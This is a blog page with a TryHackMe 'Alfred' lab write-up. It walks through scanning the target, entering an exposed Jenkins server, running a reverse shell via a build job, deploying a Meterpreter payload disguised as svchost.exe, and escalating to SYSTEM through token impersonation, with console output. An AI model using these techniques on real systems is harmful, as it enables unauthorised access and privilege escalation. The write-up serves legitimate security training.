<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="THM - Alfred" /><meta property="og:locale" content="en" /><meta name="description" content="Initial access What do Batman and Jenkins have in common? Check the page source code for the answer. Running nmap reveals that the following three TCP ports listed below are open. Visiting the website hosted on TCP port 80 displays a picture of the actor Christian Bale. To this day, no one has seen Batman and Christian Bale together in the same room." /><meta property="og:description" content="Initial access What do Batman and Jenkins have in common? Check the page source code for the answer. Running nmap reveals that the following three TCP ports listed below are open. Visiting the website hosted on TCP port 80 displays a picture of the actor Christian Bale. To this day, no one has seen Batman and Christian Bale together in the same room." /><link rel="canonical" href="https://www.decryptic.net/posts/alfred/" /><meta property="og:url" content="https://www.decryptic.net/posts/alfred/" /><meta property="og:site_name" content="Decryptic" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-25T18:25:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - Alfred" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-25T18:25:00+02:00","datePublished":"2022-07-25T18:25:00+02:00","description":"Initial access What do Batman and Jenkins have in common? Check the page source code for the answer. Running nmap reveals that the following three TCP ports listed below are open. Visiting the website hosted on TCP port 80 displays a picture of the actor Christian Bale. To this day, no one has seen Batman and Christian Bale together in the same room.","headline":"THM - Alfred","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.decryptic.net/posts/alfred/"},"url":"https://www.decryptic.net/posts/alfred/"}</script><title>THM - Alfred | Decryptic</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Decryptic"><meta name="application-name" content="Decryptic"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Decryptic</a></div><div class="site-subtitle font-italic">Cyber Security Decrypted</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/sudo-decryptic" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://linkedin.com/in/cileana" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0x6369','decryptic.net'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - Alfred</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>THM - Alfred</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1658766300" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 25, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/sudo-decryptic">Decryptic</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="542 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h2 id="initial-access"><span class="mr-2">Initial access</span><a href="#initial-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What do Batman and Jenkins have in common? Check the page source code for the answer. Running nmap reveals that the following three TCP ports listed below are open. Visiting the website hosted on TCP port 80 displays a picture of the actor Christian Bale. To this day, no one has seen Batman and Christian Bale together in the same room.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-T4</span> <span class="nt">-Pn</span> <span class="nt">-p1-10000</span> <span class="nt">-v</span> &lt;TARGET_IP&gt;
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
</pre></table></code></div></div><p>Continueing to the Jenkins server on port 8080/tcp we are greeted with a login wall. A quick Google search shows that the default username for Jenkins is admin and the password is stored in <code class="language-plaintext highlighter-rouge">$JENKINS_HOME/secrets/initialAdminPassword</code>. However, this is not an option since we do not have access to the filesystem yet. Before attempting a fully fledged and noisy brute force atack, why not check if the door is already half open? Seems like it is!</p><p>After log in we can see a project with the name “project” (confusing) was last built succesfullly almost 3 years ago. Checking the console output we see a shell executing a command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">Started by user admin
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
</span><span class="gp">[project] $</span><span class="w"> </span><span class="nb">cmd</span> <span class="na">/c </span><span class="k">call</span> <span class="kd">C</span>:\Users\bruce\AppData\Local\Temp\jenkins8034204804437582227.bat
<span class="go">
</span><span class="gp">C:\Program Files (x86)\Jenkins\workspace\project&gt;</span><span class="nb">whoami</span>
<span class="go">alfred\bruce

</span><span class="gp">C:\Program Files (x86)\Jenkins\workspace\project&gt;</span><span class="k">exit</span> <span class="m">0</span> 
<span class="go">Finished: SUCCESS
</span></pre></table></code></div></div><p>We can replace the whoami command with the powershell command provided by THM and adjust it to match your attack machine webserver and netcat listener. After running a new job for the project we obtained a shell!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4242  
<span class="go">listening on [any] 4242 ...
connect to [10.11.75.80] from (UNKNOWN) [10.10.32.229] 49312
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

</span><span class="gp">PS C:\Program Files (x86)\Jenkins\workspace\test&gt;</span><span class="w">
</span></pre></table></code></div></div><p>The first flag is located at <code class="language-plaintext highlighter-rouge">C:\Users\bruce\Desktop\user.txt</code></p><h2 id="switching-shells"><span class="mr-2">Switching shells</span><a href="#switching-shells" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The current shell works, but a meterpreter shell has much more capabilities. THM already provides the commands to create a meterpreter payload, but we are allowed to choose a name for the executable. Its a good practice to use a common executable name to seem less suspicious. After downloading the payload using the reverse shell we already have we can run the executable: <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Jenkins\workspace\test&gt; ./svchost.exe</code></p><p>Because running svchost.exe from the Jenkins folder is obviously not suspicious..</p><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Running <code class="language-plaintext highlighter-rouge">whoami /priv</code> shows we have the “SecurityImpersonation” Impersonation token level enabled. By using meterpreter we are able to assign the NT Authority\System user impersonation token:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">meterpreter &gt;</span><span class="w"> </span>getuid
<span class="go">Server username: alfred\bruce
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>impersonate_token <span class="s2">"BUILTIN</span><span class="se">\A</span><span class="s2">dministrators"</span> 
<span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>getuid
<span class="go">Server username: NT AUTHORITY\SYSTEM
</span></pre></table></code></div></div><p>Meterpreter warns us that we are not running as the system user. Windows checks the primary token of a process, not the impersonation token to determine privileges. We therefore need to migrate to a process running under the system user such as services.exe.</p><p>After migrating we are able to grab the root flag!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/tutorial/" class="post-tag no-text-decoration" >tutorial</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM+-+Alfred+-+Decryptic&url=https%3A%2F%2Fwww.decryptic.net%2Fposts%2Falfred%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM+-+Alfred+-+Decryptic&u=https%3A%2F%2Fwww.decryptic.net%2Fposts%2Falfred%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwww.decryptic.net%2Fposts%2Falfred%2F&text=THM+-+Alfred+-+Decryptic" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/steelmountain/">THM - Steel Mountain</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/commands/">commands</a> <a class="post-tag" href="/tags/shell/">shell</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/steelmountain/"><div class="card-body"> <em class="small" data-ts="1658606940" data-df="ll" > Jul 23, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Steel Mountain</h3><div class="text-muted small"><p> Introduction Steel Mountain refers to the data security firm where the protagonist Eliot broke into in the TV show Mr. Robot. Opening a browser to this machine shows a simple html website showing a...</p></div></div></a></div><div class="card"> <a href="/posts/daily-bugle/"><div class="card-body"> <em class="small" data-ts="1659697200" data-df="ll" > Aug 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Daily Bugle</h3><div class="text-muted small"><p> Naturally, as a blue teamer I have the urge to identify which TTPs have been used during an attack. So from now on, all my write ups will include this by utilizing the MITRE ATT&amp;amp;CK framework. I...</p></div></div></a></div><div class="card"> <a href="/posts/relevant/"><div class="card-body"> <em class="small" data-ts="1659898800" data-df="ll" > Aug 7, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Relevant</h3><div class="text-muted small"><p> The Relevant briefing mentiones that everything can be completed without Metasploit. Since OSCP only allows very limited use of the Metasploit Framework I took this as a challenge. Below the releva...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/steelmountain/" class="btn btn-outline-primary" prompt="Older"><p>THM - Steel Mountain</p></a> <a href="/posts/daily-bugle/" class="btn btn-outline-primary" prompt="Newer"><p>THM - Daily Bugle</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/sudo-decryptic">Decryptic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/commands/">commands</a> <a class="post-tag" href="/tags/shell/">shell</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
